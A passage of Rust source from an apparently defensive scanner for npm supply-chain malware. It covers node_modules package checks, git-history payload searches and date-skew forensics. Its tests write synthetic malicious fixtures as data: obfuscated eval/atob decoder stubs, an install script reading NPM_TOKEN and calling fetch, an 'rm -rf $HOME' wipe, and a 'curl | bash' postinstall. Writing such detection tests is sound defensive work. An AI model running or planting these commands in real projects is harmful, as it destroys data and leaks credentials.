            Some(base) => {
                let changed = diff_paths(repo, base, &oid);
                if changed.is_empty() {
                    continue;
                }
                GitTree::new_for_paths_with_reader(repo, &oid, changed, reader.clone())
            }
            // No HEAD (unborn/detached edge): fall back to scanning the full tip tree.
            None => match GitTree::new(repo, &oid) {
                Some(t) => t,
                None => continue,
            },
        };
        let mut tree_findings = scan_tree_inner(repo, &tree, packs, cancel);
        for f in &mut tree_findings {
            f.git_ref = Some(name.clone());
        }
        findings.extend(tree_findings);
    }
    findings
}

/// Cap on installed packages scanned, so a giant `node_modules` can't stall the scan.
const MAX_NODE_MODULES_PKGS: usize = 5_000;

/// Scan installed dependencies under `node_modules/` for malicious packages (name+version vs
/// `bad_packages`) and for an injected payload in each package's entrypoint (via the analyzer). The
/// general file walk prunes `node_modules` for performance; this targeted pass reads only each
/// package's `package.json` + entrypoint, so a dropper shipped *inside a dependency* is still
/// caught. Working-tree only — git trees have no `node_modules`. Findings are advisory
/// (non-remediable): the fix is to reinstall the dependency clean, not to strip an installed file.
pub fn scan_node_modules(repo: &Path, packs: &[Pack]) -> Vec<Finding> {
    let root = repo.join("node_modules");
    if !root.is_dir() {
        return Vec::new();
    }
    // Top-level packages plus one level of @scope.
    let mut pkg_dirs: Vec<PathBuf> = Vec::new();
    if let Ok(entries) = std::fs::read_dir(&root) {
        for e in entries.flatten() {
            let p = e.path();
            let Some(name) = p.file_name().and_then(|n| n.to_str()) else {
                continue;
            };
            if name.starts_with('.') || !p.is_dir() {
                continue;
            }
            if name.starts_with('@') {
                if let Ok(scoped) = std::fs::read_dir(&p) {
                    pkg_dirs.extend(scoped.flatten().map(|s| s.path()).filter(|s| s.is_dir()));
                }
            } else {
                pkg_dirs.push(p);
            }
        }
    }
    let total = pkg_dirs.len();
    let mut findings = Vec::new();
    for dir in pkg_dirs.into_iter().take(MAX_NODE_MODULES_PKGS) {
        let Ok(pj) = std::fs::read_to_string(dir.join("package.json")) else {
            continue;
        };
        let Ok(v) = serde_json::from_str::<serde_json::Value>(&pj) else {
            continue;
        };
        let name = v.get("name").and_then(|x| x.as_str()).unwrap_or_default().to_string();
        let version = v.get("version").and_then(|x| x.as_str()).map(String::from);
        // 1) Known-malicious installed package (name + version).
        for pack in packs {
            let Some(bads) = pack.manifest.bad_packages.get("npm") else {
                continue;
            };
            let entry = crate::lockfile::LockEntry {
                ecosystem: "npm".into(),
                name: name.clone(),
                version: version.clone(),
            };
            for bad in bads {
                if bad.name == name && crate::lockfile::version_matches(&entry, &bad.versions) {
                    let community = bad.confidence == crate::matchers::Confidence::Community;
                    let prefix = if community { "pkg-community" } else { "pkg" };
                    let ver = version.as_deref().map(|x| format!("@{x}")).unwrap_or_default();
                    let rel = dir.strip_prefix(repo).unwrap_or(&dir).join("package.json");
                    findings.push(Finding {
                        campaign: pack.manifest.id.clone(),
                        severity: if community { Severity::Low } else { pack.manifest.severity.clone() },
                        repo: repo.to_path_buf(),
                        file: Some(rel),
                        signature_id: format!("{prefix}:npm:{name}{ver}"),
                        kind: FindingKind::NpmPackage,
                        evidence: format!(
                            "malicious npm package '{name}'{ver} installed in node_modules{}",
                            if community { " (community-sourced lead)" } else { "" }
                        ),
                        remediable: false,
                        online: None,
                        git_ref: None,
                    });
                }
            }
        }
        // 2) Injected payload in the package entrypoint (analyzer-confirmed).
        let main = v.get("main").and_then(|x| x.as_str()).unwrap_or("index.js");
        let mut seen_entry = HashSet::new();
        for cand in [main, "index.js", "src/index.js"] {
            if !seen_entry.insert(cand.to_string()) {
                continue;
            }
            let entry_path = dir.join(cand);
            let Ok(content) = std::fs::read_to_string(&entry_path) else {
                continue;
            };
            if looks_binary(&content) || content.len() > MAX_CONTENT_BYTES {
                continue;
            }
            let rel = entry_path.strip_prefix(repo).unwrap_or(&entry_path).to_path_buf();
            for pack in packs {
                if let Some(analyzer) = &pack.analyzer {
                    let sf = ScannedFile {
                        repo: repo.to_path_buf(),
                        path: rel.clone(),
                        content: content.clone(),
                    };
                    findings.extend(analyzer.analyze(&sf));
                }
            }
        }
    }
    // Advisory only — the remediation for a tainted dependency is a clean reinstall, not an
    // in-place strip of a file npm will overwrite.
    for f in &mut findings {
        f.remediable = false;
    }
    if total > MAX_NODE_MODULES_PKGS {
        findings.push(Finding {
            campaign: "generic".into(),
            severity: Severity::Info,
            repo: repo.to_path_buf(),
            file: Some(PathBuf::from("node_modules")),
            signature_id: "node-modules-truncated".into(),
            kind: FindingKind::Capability,
            evidence: format!(
                "node_modules scan capped at {MAX_NODE_MODULES_PKGS} of {total} packages — some deps not inspected"
            ),
            remediable: false,
            online: None,
            git_ref: None,
        });
    }
    findings
}

/// High-specificity injection markers to pickaxe through full history. Deliberately EXCLUDES the
/// bare decoder name (`_$_1e42`) and generic seeds — those legitimately appear in security
/// write-ups and scanner sources and would false-positive (as they did for `stamparm/maltrail`).
/// The composite markers below essentially never occur outside a real payload.
fn history_markers(packs: &[Pack]) -> Vec<(String, String)> {
    const MARKER_IDS: [&str; 3] = ["primary", "secondary", "variant-april"];
    let mut out = Vec::new();
    for pack in packs {
        for sig in &pack.manifest.content_signatures {
            if sig.kind == crate::matchers::SignatureKind::Literal
                && MARKER_IDS.contains(&sig.id.as_str())
            {
                out.push((pack.manifest.id.clone(), sig.value.clone()));
            }
        }
    }
    out
}

/// Cap on history findings per repo, so a pathological history can't flood the report.
const MAX_HISTORY_HITS: usize = 200;

/// Opt-in per-commit history scan (`--history`): pickaxe (`git log --all -S <marker>`) each
/// high-specificity injection marker across ALL refs to surface infections scrubbed from the
/// working tree / branch tips but still reachable via `git checkout`. Emits Medium, advisory,
/// non-remediable [`FindingKind::HistoryHit`]s stamped with the commit sha.
pub fn scan_history(repo: &Path, packs: &[Pack]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut seen: HashSet<(String, String)> = HashSet::new();
    for (campaign, marker) in history_markers(packs) {
        if findings.len() >= MAX_HISTORY_HITS {
            break;
        }
        let out = crate::proc::git()
            .arg("-C")
            .arg(repo)
            .args(["log", "--all", "-S", &marker, "--format=%H%x1f%aI%x1f%an%x1f%s"])
            .output();
        let out = match out {
            Ok(o) if o.status.success() => o,
            _ => continue,
        };
        for line in String::from_utf8_lossy(&out.stdout).lines() {
            if findings.len() >= MAX_HISTORY_HITS {
                break;
            }
            let mut p = line.split('\u{1f}');
            let sha = match p.next() {
                Some(s) if !s.is_empty() => s.to_string(),
                _ => continue,
            };
            let date = p.next().unwrap_or("");
            let author = p.next().unwrap_or("");
            let subject = p.next().unwrap_or("");
            if !seen.insert((campaign.clone(), sha.clone())) {
                continue;
            }
            let short = sha.chars().take(12).collect::<String>();
            findings.push(Finding {
                campaign: campaign.clone(),
                severity: Severity::Medium,
                repo: repo.to_path_buf(),
                file: None,
                signature_id: "history-hit".into(),
                kind: FindingKind::HistoryHit,
                evidence: format!(
                    "payload marker in history commit {short} ({date}, {author}: {subject}) — reachable via git checkout"
                ),
                remediable: false,
                online: None,
                git_ref: Some(short),
            });
        }
    }
    findings
}

/// Author↔committer timestamp gap (seconds) above which a commit is flagged as anti-dated. A
/// normal rebase keeps the two within minutes/hours; a clock-rewound `--amend` (temp_auto_push.bat)
/// or a deliberately anti-dated commit opens a large gap. 24h keeps benign rebases quiet.
const DATE_SKEW_THRESHOLD_SECS: i64 = 24 * 3600;

/// Cap on date-skew findings per repo.
const MAX_DATE_SKEW_HITS: usize = 100;

/// Opt-in git-forensic scan: flag commits whose author and committer timestamps diverge by more
/// than [`DATE_SKEW_THRESHOLD_SECS`] — a tell of anti-dated / clock-manipulated commits. Advisory
/// (Medium, non-remediable); a large gap can also be a legitimate long-delayed rebase, so the
/// evidence says so. Campaign-agnostic (no pack needed).
pub fn scan_date_skew(repo: &Path) -> Vec<Finding> {
    let out = crate::proc::git()
        .arg("-C")
        .arg(repo)
        .args(["log", "--all", "--no-show-signature", "--format=%H%x1f%at%x1f%ct%x1f%an"])
        .output();
    let out = match out {
        Ok(o) if o.status.success() => o,
        _ => return Vec::new(),
    };
    let mut findings = Vec::new();
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        if findings.len() >= MAX_DATE_SKEW_HITS {
            break;
        }
        let mut p = line.split('\u{1f}');
        let (Some(sha), Some(at), Some(ct), author) =
            (p.next(), p.next(), p.next(), p.next().unwrap_or(""))
        else {
            continue;
        };
        let (Ok(at), Ok(ct)) = (at.parse::<i64>(), ct.parse::<i64>()) else {
            continue;
        };
        let gap = (at - ct).abs();
        if gap > DATE_SKEW_THRESHOLD_SECS {
            let short = sha.chars().take(12).collect::<String>();
            let days = gap / 86_400;
            findings.push(Finding {
                campaign: "generic".into(),
                severity: Severity::Medium,
                repo: repo.to_path_buf(),
                file: None,
                signature_id: "git-date-skew".into(),
                kind: FindingKind::DateSkew,
                evidence: format!(
                    "commit {short} ({author}) author/committer dates differ by ~{days}d — possible anti-dated commit (or a long-delayed rebase)"
                ),
                remediable: false,
                online: None,
                git_ref: Some(short),
            });
        }
    }
    findings
}

pub fn scan_deep(roots: &[PathBuf], packs: &[Pack]) -> ScanReport {
    let mut repos: Vec<PathBuf> = Vec::new();
    for root in roots {
        repos.extend(discover_repos(root));
    }
    repos.sort();
    repos.dedup();

    let findings: Vec<Finding> = repos
        .par_iter()
        .flat_map(|repo| {
            let mut f = scan_repo(repo, packs);
            f.extend(deep_scan_repo(repo, packs));
            f
        })
        .collect();

    ScanReport { findings, repos_scanned: repos.len() }
}

/// Which phase a per-repo [`RepoScanEvent`] reports.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScanPhase {
    /// The repo's scan has just started (in progress).
    Scanning,
    /// The repo's scan finished; `findings` is its result count.
    Scanned,
}

/// A live progress event emitted for one repo during [`scan_streaming`].
pub struct RepoScanEvent<'a> {
    pub phase: ScanPhase,
    /// Repos fully scanned so far (excludes the in-progress one on `Scanning`).
    pub done: usize,
    pub total: usize,
    pub repo: &'a Path,
    /// Findings in this repo — only meaningful on `Scanned` (0 on `Scanning`).
    pub findings: usize,
}

/// Cancellable scan with live per-repo progress. Discovers repos under `roots`, scans each in
/// parallel (`deep` = also branch tips), and calls `on_event` with a `Scanning` event when a
/// repo starts and a `Scanned` event (with its finding count) when it finishes. The `cancel`
/// flag is cooperative and threaded into the per-file loops, so a Stop request lands mid-repo,
/// not just at repo boundaries; a cancelled run returns a partial report. The GUI drives this
/// for its live log and Stop button.
pub fn scan_streaming(
    roots: &[PathBuf],
    packs: &[Pack],
    deep: bool,
    cancel: &std::sync::atomic::AtomicBool,
    on_event: &(dyn Fn(RepoScanEvent) + Sync),
) -> ScanReport {
    use std::sync::atomic::{AtomicUsize, Ordering};
    let mut repos: Vec<PathBuf> = Vec::new();
    // Discovery descends into node_modules and is often the slowest phase on a large tree; make
    // it cancellable so Stop is honored during "discovering repositories…", not only afterward.
    for root in roots {
        if cancel.load(Ordering::Relaxed) {
            break;
        }
        repos.extend(discover_repos_cancellable(root, cancel));
    }
    repos.sort();
    repos.dedup();
    let total = repos.len();
    let done = AtomicUsize::new(0);

    // Parallel across repos (rayon) for speed. Each repo emits a `Scanning` event when it
    // starts and a `Scanned` event (with its finding count) when it finishes — events arrive
    // in real completion order, not input order. Cancellation is a cooperative flag threaded
    // all the way into the per-file loops (`scan_repo_inner`) and, for deep scans, between
    // branch tips — so an in-flight repo stops mid-file rather than running to completion, and
    // the remaining repos are skipped. Stop is honored even inside one large repository.
    let findings: Vec<Finding> = repos
        .par_iter()
        .flat_map(|repo| {
            if cancel.load(Ordering::Relaxed) {
                return Vec::new();
            }
            on_event(RepoScanEvent {
                phase: ScanPhase::Scanning,
                done: done.load(Ordering::Relaxed),
                total,
                repo,
                findings: 0,
            });
            let mut f = scan_repo_inner(repo, packs, cancel);
            if deep {
                f.extend(deep_scan_repo_cancellable(repo, packs, cancel));
            }
            let count = f.len();
            let n = done.fetch_add(1, Ordering::Relaxed) + 1;
            on_event(RepoScanEvent {
                phase: ScanPhase::Scanned,
                done: n,
                total,
                repo,
                findings: count,
            });
            f
        })
        .collect();

    ScanReport { findings, repos_scanned: done.load(Ordering::Relaxed) }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::finding::Severity;
    use crate::matchers::{ContentSignature, SignatureKind};
    use crate::pack::{PackManifest, ScannedFile};
    use std::fs;
    use tempfile::TempDir;

    fn literal_pack() -> Pack {
        let manifest = PackManifest {
            id: "polinrider".into(),
            name: "PolinRider".into(),
            description: String::new(),
            references: vec![],
            severity: Severity::Critical,
            target_files: vec!["postcss.config.mjs".into()],
            content_signatures: vec![ContentSignature {
                id: "primary".into(),
                kind: SignatureKind::Literal,
                value: "rmcej%otb%".into(),
            }],
            artifacts: vec![],
            gitignore_injections: vec![],
            bad_npm_packages: vec![],
            bad_packages: Default::default(),
            ioc_domains: vec![],
            analyzer: None,
            remediation: None,
        };
        Pack { manifest, analyzer: None }
    }

    fn make_repo(tmp: &TempDir) -> PathBuf {
        let repo = tmp.path().join("proj");
        fs::create_dir_all(repo.join(".git")).unwrap();
        repo
    }

    #[test]
    fn capability_flags_obfuscated_config_without_pack() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default {};\nglobal['!']='8-270-2';var _$_1e42=[];require('https')",
        )
        .unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_capabilities(&repo, &files);
        assert!(f
            .iter()
            .any(|x| x.kind == FindingKind::Capability && x.campaign == "generic"));
    }

    #[test]
    fn capability_reaches_dropped_file() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("package.json"), r#"{"scripts":{"preinstall":"node setup_bun.js"}}"#)
            .unwrap();
        fs::write(
            repo.join("setup_bun.js"),
            "global['r']=require;const x=String.fromCharCode(1,2,3,4,5);process.env.NPM_TOKEN;fetch('http://x')",
        )
        .unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_capabilities(&repo, &files);
        assert!(f
            .iter()
            .any(|x| x.kind == FindingKind::Capability && x.file == Some(PathBuf::from("setup_bun.js"))));
    }

    #[test]
    fn package_dropper_verdict_pure_signals() {
        // Malicious install script: OBFUSCATED (decoder) + behavioral (spawn) -> dropper. (A bare
        // `curl|bash` postinstall is deliberately NOT flagged — legit installs do that.)
        let pj_bad = r#"{"scripts":{"postinstall":"node -e \"var _$_a1b2=atob('x');require('child_process').exec('id')\""}}"#;
        assert!(package_dropper_verdict(pj_bad, None), "obfuscated+spawn install script is a dropper");
        // Obfuscated entry (decoder) -> dropper.
        assert!(package_dropper_verdict("{}", Some("var _$_1e42=(function(a){return eval(a)})('x');")));
        // Clean package with a normal build script + benign entry -> not a dropper.
        let pj_ok = r#"{"scripts":{"build":"tsc","test":"jest","postinstall":"curl https://x | bash"}}"#;
        assert!(!package_dropper_verdict(pj_ok, Some("module.exports = function(){ return 1; };")));
    }

    #[test]
    fn typosquat_dependency_with_dropper_is_medium() {
        // Delivery-vector detection: a dependency whose NAME is a typosquat of a popular package
        // AND whose installed package shows dropper behaviour (obfuscated entry) -> visible Medium.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(
            repo.join("package.json"),
            r#"{"dependencies":{"tailwindcss-style-animate":"1.0.0","react":"18.0.0"}}"#,
        )
        .unwrap();
        let pkg = repo.join("node_modules").join("tailwindcss-style-animate");
        fs::create_dir_all(&pkg).unwrap();
        fs::write(
            pkg.join("package.json"),
            r#"{"name":"tailwindcss-style-animate","version":"1.0.0","main":"index.js"}"#,
        )
        .unwrap();
        fs::write(
            pkg.join("index.js"),
            "var _$_1e42=(function(a,b){return eval(atob(a))})('x',1234567);global['r']=require;",
        )
        .unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_dependency_typosquats(&repo, &files, &[]);
        let hit = f.iter().find(|x| x.signature_id == "typosquat:tailwindcss-style-animate");
        assert!(hit.is_some(), "malicious typosquat dependency must be Medium-flagged: {f:?}");
        assert_eq!(hit.unwrap().severity, Severity::Medium);
        assert!(!f.iter().any(|x| x.signature_id.contains("react")), "legit react must not flag");
    }

    #[test]
    fn misspelling_without_dropper_is_community_low() {
        // A one-edit MISSPELLING of a popular name is a strong-enough name signal to surface as a
        // suppressed community lead even without behaviour — but never a default-visible Medium.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        // `tailwindcs` = `tailwindcss` minus one char (edit distance 1) -> Misspelling.
        fs::write(repo.join("package.json"), r#"{"dependencies":{"tailwindcs":"1.0.0"}}"#).unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_dependency_typosquats(&repo, &files, &[]);
        assert!(
            f.iter().any(|x| x.signature_id == "pkg-community:typosquat:tailwindcs"),
            "misspelling must surface as a community lead: {f:?}"
        );
        assert!(!f.iter().any(|x| x.severity == Severity::Medium), "no behaviour -> not Medium");
    }

    #[test]
    fn real_legit_lookalikes_installed_clean_produce_no_findings() {
        // Adversarial real-npm audit: ~300 legit packages match the (deliberately broad) decoration
        // matcher — chalk-cli, prettier-plugin-tailwindcss, element-theme-chalk, hundreds of
        // tailwindcss-* plugins. Installed and CLEAN, every one must produce ZERO findings; the
        // behaviour gate is the sole discriminator. A dropper-bearing one of the SAME names fires.
        const LEGIT: &[&str] = &[
            "chalk-cli", "chalk-table", "chalk-template", "chalk-pipe", "console-chalk",
            "winston-chalk", "element-theme-chalk", "theme-chalk", "prettier-plugin-tailwindcss",
            "tailwindcss-line-clamp", "tailwindcss-animate-x", "tailwind-scrollbar-hide",
            "tailwind-styled-components", "vue-tailwind", "tailwindcss-motion",
            "tailwindcss-radix-colors", "css-to-tailwindcss", "monaco-tailwindcss",
        ];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let deps: String =
            LEGIT.iter().map(|n| format!("\"{n}\":\"1.0.0\"")).collect::<Vec<_>>().join(",");
        fs::write(repo.join("package.json"), format!("{{\"dependencies\":{{{deps}}}}}")).unwrap();
        for n in LEGIT {
            let pkg = repo.join("node_modules").join(n);
            fs::create_dir_all(&pkg).unwrap();
            fs::write(pkg.join("package.json"), format!("{{\"name\":\"{n}\",\"version\":\"1.0.0\"}}"))
                .unwrap();
            fs::write(pkg.join("index.js"), "module.exports = function(){ return 'ok'; };\n").unwrap();
        }
        let f = scan_dependency_typosquats(&repo, &WorkingTree::new(&repo), &[]);
        assert!(f.is_empty(), "clean legit look-alikes must produce zero findings: {f:?}");

        // Discrimination control: same name set, but now one carries a dropper -> Medium.
        fs::write(
            repo.join("node_modules").join("tailwindcss-motion").join("index.js"),
            "var _$_1e42=(function(a,b){return eval(atob(a))})('x',1234567);",
        )
        .unwrap();
        let f2 = scan_dependency_typosquats(&repo, &WorkingTree::new(&repo), &[]);
        assert!(
            f2.iter().any(|x| x.signature_id == "typosquat:tailwindcss-motion"
                && x.severity == Severity::Medium),
            "a dropper-bearing look-alike must fire Medium: {f2:?}"
        );
    }

    #[test]
    fn decoration_without_dropper_is_not_flagged() {
        // FP guard: a `<root>-<word>` DECORATION with no dropper behaviour must produce NO finding
        // at all (not even a community lead) — the legit ecosystem is full of such names.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        // clean, uninstalled decoration-shaped dependency
        fs::write(repo.join("package.json"), r#"{"dependencies":{"tailwind-gridhelper":"1.0.0"}}"#)
            .unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_dependency_typosquats(&repo, &files, &[]);
        assert!(f.is_empty(), "uncorroborated decoration must not be flagged: {f:?}");
    }

    #[test]
    fn legit_lookalike_dependency_never_flagged() {
        // Real, popular look-alike packages must produce NO finding at all (allowlist + scope rules).
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(
            repo.join("package.json"),
            r#"{"dependencies":{"tailwindcss-animate":"1.0.0","tailwind-merge":"2.0.0","@tailwindcss/typography":"0.5.0","eslint-plugin-react":"7.0.0"}}"#,
        )
        .unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_dependency_typosquats(&repo, &files, &[]);
        assert!(f.is_empty(), "legit look-alike dependencies must never be flagged: {f:?}");
    }

    #[test]
    fn injection_structure_flags_payload_in_non_config_source() {
        // Corpus gap (84 of 692 infected repos): PolinRider appends its payload to arbitrary
        // executable source (server.js, routes/*.js, Gruntfile.js, .prettierrc.mjs, controllers…),
        // which the surface/target passes never read. The repo-wide structural pass catches it
        // version-independently. Note the NON-`5-3` version tag (`9-5334`) seen in the wild — the
        // structure, not the constant, is what fires.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let pad = " ".repeat(2000);
        fs::write(
            repo.join("server.js"),
            format!(
                "const app = require('express')();\nmodule.exports = app;{pad}global['!']='9-5334';var _$_1e42=(function(a,b){{return eval(atob(a))}})('x',1234567);"
            ),
        )
        .unwrap();
        fs::write(repo.join("clean.js"), "const x = 1;\nmodule.exports = { x };\n").unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_injection_structure(&repo, &files);
        assert!(
            f.iter().any(|x| x.file == Some(PathBuf::from("server.js"))),
            "payload in non-config server.js must be flagged: {f:?}"
        );
        assert!(
            !f.iter().any(|x| x.file == Some(PathBuf::from("clean.js"))),
            "a clean source file must not be flagged"
        );
    }

    #[test]
    fn injection_structure_skips_minified_and_excluded() {
        // FP-safety: a minified bundle (no whitespace runs, no `_$_hex` decoder) and anything in a
        // build-output dir must not fire, or the repo-wide pass would be noisy on generated code.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let minified = "var a=1;function f(){return a};module.exports={f};".repeat(80);
        fs::write(repo.join("bundle.js"), &minified).unwrap();
        fs::create_dir_all(repo.join("dist")).unwrap();
        let pad = " ".repeat(2000);
        fs::write(
            repo.join("dist").join("app.js"),
            format!("module.exports={{}};{pad}var _$_1e42=eval(x);"),
        )
        .unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_injection_structure(&repo, &files);
        assert!(f.is_empty(), "minified + build-output must not fire: {f:?}");
    }

    #[test]
    fn injection_structure_does_not_duplicate_surface_findings() {
        // A config already flagged by the surface passes must NOT also receive a redundant
        // repo-wide `injection:structural` finding (dedup by file).
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let pad = " ".repeat(2000);
        fs::write(
            repo.join("postcss.config.mjs"),
            format!(
                "export default {{}};{pad}global['!']='9-5334';var _$_1e42=(function(a,b){{return a}})('x',1234567);"
            ),
        )
        .unwrap();
        let files = WorkingTree::new(&repo);
        let all = scan_tree(&repo, &files, &[literal_pack()]);
        assert!(
            all.iter().any(|x| x.file == Some(PathBuf::from("postcss.config.mjs"))),
            "the config must still be detected"
        );
        assert!(
            !all.iter().any(|x| x.file == Some(PathBuf::from("postcss.config.mjs"))
                && x.signature_id == "injection:structural"),
            "a surface-covered file must not also get the repo-wide structural finding: {all:?}"
        );
    }

    #[test]
    fn derived_entry_file_scored_as_derivedscript_regardless_of_order() {
        // app.js is BOTH a classified ConfigFile AND a one-hop derived dropper
        // (preinstall: node app.js). DerivedScript's gate is a strict superset of
        // ConfigFile's — it also fires on destructive_wipe/propagation. The surface
        // decision must be independent of path iteration order: the wipe payload must
        // fire even though "app.js" sorts before "package.json" (so the ConfigFile
        // classify pass would otherwise claim it first and miss destructive_wipe).
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("package.json"), r#"{"scripts":{"preinstall":"node app.js"}}"#).unwrap();
        fs::write(repo.join("app.js"), "#!/bin/sh\nrm -rf $HOME\n").unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_capabilities(&repo, &files);
        assert!(
            f.iter()
                .any(|x| x.kind == FindingKind::Capability && x.file == Some(PathBuf::from("app.js"))),
            "wipe payload in a reachable entry file must fire under DerivedScript regardless of order"
        );
    }

    #[test]
    fn derived_target_resolves_against_manifest_dir() {
        // A nested manifest packages/web/package.json with "postinstall":"node ./setup.js"
        // and the payload at packages/web/setup.js. npm runs lifecycle scripts with
        // CWD = the manifest's dir, so the one-hop target must resolve there, not against
        // the repo root (spec §6) — otherwise nested-monorepo droppers are missed.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let web = repo.join("packages/web");
        fs::create_dir_all(&web).unwrap();
        fs::write(web.join("package.json"), r#"{"scripts":{"postinstall":"node ./setup.js"}}"#)
            .unwrap();
        fs::write(
            web.join("setup.js"),
            "global['r']=require;fetch('http://x');process.env.NPM_TOKEN",
        )
        .unwrap();
        let files = WorkingTree::new(&repo);
        let f = scan_capabilities(&repo, &files);
        assert!(
            f.iter().any(|x| x.kind == FindingKind::Capability
                && x.file == Some(PathBuf::from("packages/web/setup.js"))),
            "nested derived target must resolve against the manifest dir"
        );
    }

    #[test]
    fn capability_pass_only_reads_surface_files() {
        // Regression: scan_capabilities must NOT read every file in the tree (that made
        // scan_repo read multi-GB target/ dirs and hang the Clean preview). classify() is
        // path-only, so only surface / package.json / root-json files should be read.
        use std::cell::RefCell;
        use std::collections::HashMap as Map;

        struct Counting {
            paths: Vec<PathBuf>,
            contents: Map<PathBuf, String>,
            reads: RefCell<usize>,
        }
        impl RepoFiles for Counting {
            fn paths(&self) -> &[PathBuf] {
                &self.paths
            }
            fn read(&self, rel: &Path) -> Option<String> {
                *self.reads.borrow_mut() += 1;
                self.contents.get(rel).cloned()
            }
        }

        let mut paths = Vec::new();
        let mut contents = Map::new();
        for i in 0..500 {
            let p = PathBuf::from(format!("src/mod{i}.rs"));
            contents.insert(p.clone(), "fn main() {}".into());
            paths.push(p);
        }
        let cfg = PathBuf::from("postcss.config.mjs");
        contents.insert(cfg.clone(), "export default {};".into());
        paths.push(cfg);

        let files = Counting { paths, contents, reads: RefCell::new(0) };
        let _ = scan_capabilities(Path::new("/repo"), &files);
        assert!(
            *files.reads.borrow() <= 2,
            "read {} files; non-surface files must be skipped without reading",
            files.reads.borrow()
        );
    }

    #[test]
    fn deep_scan_cancellable_bails_when_flag_set() {
        use std::process::Command;
        use std::sync::atomic::AtomicBool;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git")
                .arg("-C")
                .arg(repo)
                .args(args)
                .env("GIT_AUTHOR_NAME", "t")
                .env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t")
                .env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status()
                .unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        std::fs::write(repo.join("postcss.config.mjs"), "export default {};").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "c"]);
        git(&repo, &["checkout", "-q", "-b", "evil"]);
        std::fs::write(repo.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        git(&repo, &["commit", "-q", "-am", "p"]);
        git(&repo, &["checkout", "-q", "main"]);

        // Not cancelled: finds the payload on the 'evil' branch tip.
        let live = deep_scan_repo_cancellable(&repo, &[literal_pack()], &AtomicBool::new(false));
        assert!(live.iter().any(|f| f.git_ref.as_deref() == Some("evil")));
        // Cancelled up front: bails before scanning any branch.
        let cancelled = deep_scan_repo_cancellable(&repo, &[literal_pack()], &AtomicBool::new(true));
        assert!(cancelled.is_empty());
    }

    #[test]
    fn scan_stops_mid_repo_when_cancelled_during_iteration() {
        // A single big repo must be stoppable mid-scan, not only between repos: the file loop
        // polls `cancel` per file. Here the flag flips while the FIRST config file is read, so
        // the loop must break before the second file — proving Stop lands inside one repo.
        struct Files<'a> {
            paths: Vec<PathBuf>,
            body: String,
            // When armed, read() flips `cancel` the first time a file is read.
            arm: bool,
            cancel: &'a AtomicBool,
        }
        impl RepoFiles for Files<'_> {
            fn paths(&self) -> &[PathBuf] {
                &self.paths
            }
            fn read(&self, _rel: &Path) -> Option<String> {
                if self.arm {
                    self.cancel.store(true, Ordering::Relaxed);
                }
                Some(self.body.clone())
            }
        }

        // Content known to score a generic Capability finding under the ConfigFile surface.
        let body =
            "export default {};\nglobal['!']='8-270-2';var _$_1e42=[];require('https')".to_string();
        let paths = vec![
            PathBuf::from("postcss.config.mjs"),
            PathBuf::from("packages/web/postcss.config.mjs"),
        ];
        let hits = |f: &[Finding]| f.iter().filter(|x| x.kind == FindingKind::Capability).count();

        // Control: never cancelled -> both infected config files score.
        let never = AtomicBool::new(false);
        let ctrl = Files { paths: paths.clone(), body: body.clone(), arm: false, cancel: &never };
        assert_eq!(
            hits(&scan_capabilities_inner(Path::new("/repo"), &ctrl, &never)),
            2,
            "both infected config files must score without cancellation",
        );

        // Cancelled mid-iteration: the flag flips while reading the first file, so the loop
        // breaks before the second and only the first is scored.
        let flag = AtomicBool::new(false);
        let armed = Files { paths, body, arm: true, cancel: &flag };
        assert_eq!(
            hits(&scan_capabilities_inner(Path::new("/repo"), &armed, &flag)),
            1,
            "cancellation during iteration must stop the scan mid-repo",
        );
    }

    #[test]
    fn scan_streaming_bails_during_discovery_when_cancelled() {
        // The GUI's `scan` command calls scan_streaming. Discovery runs before the scan loop;
        // if it isn't cancellable, Stop does nothing while "discovering repositories…" churns
        // through a large tree. A pre-set flag must abandon discovery and scan nothing.
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::write(repo.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        let roots = vec![tmp.path().to_path_buf()];

        let report =
            scan_streaming(&roots, &[literal_pack()], false, &AtomicBool::new(true), &|_e| {});
        assert_eq!(report.repos_scanned, 0, "cancelled discovery must scan no repos");
        assert!(report.findings.is_empty(), "cancelled discovery must produce no findings");
    }

    #[test]
    fn capability_clean_repo_silent() {
        let tmp = TempDir::new().unwrap();
